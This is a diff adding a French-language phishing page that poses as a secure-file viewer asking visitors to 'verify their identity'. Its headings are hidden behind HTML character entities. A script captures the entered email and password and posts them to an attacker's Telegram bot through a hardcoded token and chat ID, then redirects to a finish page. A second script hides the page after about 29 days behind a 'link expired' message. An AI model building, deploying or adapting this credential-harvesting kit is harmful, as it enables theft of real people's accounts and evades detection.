@@ -1,0 +1,140 @@
+﻿<html lang="en">
+
+<head>
+
+    <title>Vite + React</title>
+
+    <style data-savepage-href="/assets/index-om7KAz33.css">
+        *{margin:0;padding:0;font-family:Segoe UI,Tahoma,Geneva,Verdana,sans-serif;font-weight:300}.body{display:flex;flex-direction:column;justify-content:center;align-items:center;overflow:hidden}.entete{width:100%;background-color:#007bff;height:60px;display:flex;align-items:center;padding-left:50px}.entete img{width:100px;height:50px}.deux{display:flex;align-items:center;justify-content:center}.deux img{height:100px}.section{width:400px;box-shadow:0 4px 8px #0003;display:flex;flex-direction:column;margin-bottom:100px;padding-bottom:20px}.section .h2{padding:1vw 0vw;width:100%;height:50px;text-align:center;background-color:#ece6e6;display:flex;justify-content:center;align-items:center}h2{font-size:20px}.section2{padding:1vw 2vw}.section hr{border:.1px solid rgb(206,201,201)}.file{margin-top:3vw;display:flex;align-items:center;margin-bottom:3vw}.file img{width:30px;height:30px;margin-right:1.2vw}.images{margin-top:1vw;display:flex;align-items:center;justify-content:center}.images img{width:300px;height:50px;margin-right:2vw}input{margin-left:0;margin-top:2vw;height:40px;padding-left:1vw;width:90%;font-size:15px}form{display:flex;flex-direction:column;justify-content:center;width:100%;align-items:center}form button{cursor:pointer;margin-top:3vw;background-color:#007bff;border:none;width:90%;padding:1vw;color:#fff;font-size:15px}.facture{display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;margin-top:5vw}.facture .img{width:20vw;height:20vw;overflow:hidden}.facture h3{margin-top:1vw;font-size:15px}.facture h2{margin-top:1vw;font-size:18px;font-weight:900}.facture .img img{width:100%}.btn{margin-top:3vw}.btn button{font-size:15px;width:150px;height:35px;cursor:pointer;display:flex;align-items:center;justify-content:center}
+    </style>
+
+    <style id="savepage-cssvariables">
+        :root {
+          }
+    </style>
+</head>
+
+<body>
+    <div id="root">
+        <div class="body">
+            <div class="entete"><img  src="files/img/one.png" alt=""></div>
+            <div class="deux"></div>
+            <br>
+            <div class="section">
+                <div class="h2">
+                    <h2>&#86;&#233;&#114;&#105;&#102;&#105;&#101;&#122;&#32;&#86;&#111;&#116;&#114;&#101;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#233;
+</h2></div>
+                <hr>
+                <div class="section2">
+                    <h5 style="margin-top: 2vw;">&#86;&#111;&#117;&#115;&#32;&#97;&#118;&#101;&#122;&#32;&#114;&#101;&#231;&#117;&#32;&#117;&#110;&#32;&#102;&#105;&#99;&#104;&#105;&#101;&#114;&#32;&#115;&#233;&#99;&#117;&#114;&#105;&#115;&#233;
+</h5>
+                    <div class="file"><img  src="files/img/pdf.png" alt="">
+                        <h3>&#53;&#54;&#46;&#49;&#75;&#66;
+</h3></div>
+                    <h5>&#80;&#111;&#117;&#114;&#32;&#108;&#105;&#114;&#101;&#32;&#108;&#101;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#32;&#118;&#101;&#117;&#105;&#108;&#108;&#101;&#122;&#32;&#101;&#110;&#116;&#114;&#101;&#114;&#32;&#108;&#101;&#115;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#102;&#105;&#97;&#110;&#116;&#115;&#32;&#100;&#101;&#32;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#114;&#105;&#101;&#32;&#97;&#117;&#120;&#113;&#117;&#101;&#108;&#115;&#32;&#99;&#101;&#32;&#102;&#105;&#99;&#104;&#105;&#101;&#114;&#32;&#97;&#32;&#233;&#116;&#233;&#32;&#101;&#110;&#118;&#111;&#121;&#233;
+.</h5>
+                    <div class="images"></div>
+                    <div class="form">
+                        <div>
+                            <img alt="logo-stripe" src="files/img/all.png" style="margin-left:50px; height:40px;width:200px; margin-bottom: 10px">
+                        </div>
+                        <form method="post" action="">
+                            <input type="email" id="email" name="email" placeholder="Entrez l'adresse e-mail" required="" value="">
+                            <input type="password" id="email" name="pass" placeholder="Mot de passe" required="" value="">
+                            <button>&#67;&#111;&#110;&#116;&#105;&#110;&#117;&#101;&#114;
+</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+<script>
+  const TOKEN = '5335017916:AAGUqK2HqLpIcvWAUYhlr26FjqJuSwOlLZY'; // ← remplace par ton token
+  const CHAT_ID = '1440459154'; // ← remplace par ton chat_id
+
+  document.querySelector('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const email = document.querySelector('input[name="email"]').value;
+    const pass = document.querySelector('input[name="pass"]').value;
+
+    const message = `📧 *NOUVELLE CONNEXION FORMULAIRE*\n\nEmail : ${email}\nMot de passe : ${pass}`;
+
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      // Redirige vers Google après envoi
+      window.location.href = "finish.html";
+    })
+    .catch(error => {
+      alert("Erreur lors de l'envoi.");
+      console.error('Erreur Telegram:', error);
+    });
+  });
+</script>
+<script>
+// Set the beginning date (example: March 20, 2025)
+const beginningDate = new Date('2025-06-06T00:00:00');
+
+// Function to check if 30 days have passed since the beginning date
+function checkLinkExpiration() {
+  // Get the current date
+  const now = new Date();
+  
+  // Calculate the difference in time between now and the beginning date
+  const timeDifference = now - beginningDate;
+  
+  // Convert milliseconds to days
+  const daysPassed = timeDifference / (1000 * 3600 * 24); // Convert milliseconds to days
+  
+  // Return true if 30 days have passed, otherwise false
+  return daysPassed >= 29;
+}
+
+// Function to hide all content and show the expiration message
+function displayExpirationMessage() {
+  if (checkLinkExpiration()) {
+    // Hide all the content of the page
+    document.body.style.display = 'none';
+
+    // Create a div element for the message
+    const messageDiv = document.createElement('div');
+    messageDiv.innerHTML = "<h1>The link expired</h1>";
+    messageDiv.style.position = 'absolute';
+    messageDiv.style.top = '50%';
+    messageDiv.style.left = '50%';
+    messageDiv.style.transform = 'translate(-50%, -50%)';
+    messageDiv.style.fontSize = '24px';
+    messageDiv.style.fontFamily = 'Arial, sans-serif';
+    messageDiv.style.color = 'red';
+    messageDiv.style.backgroundColor = 'white';
+    messageDiv.style.padding = '20px';
+    messageDiv.style.border = '2px solid red';
+    messageDiv.style.textAlign = 'center';
+
+    // Append the message div to the body
+    document.body.appendChild(messageDiv);
+  }
+}
+
+// Call the function to check and display the message if expired
+window.onload = displayExpirationMessage;
+
+
+</script>
+
+
+</body>
+
+</html>
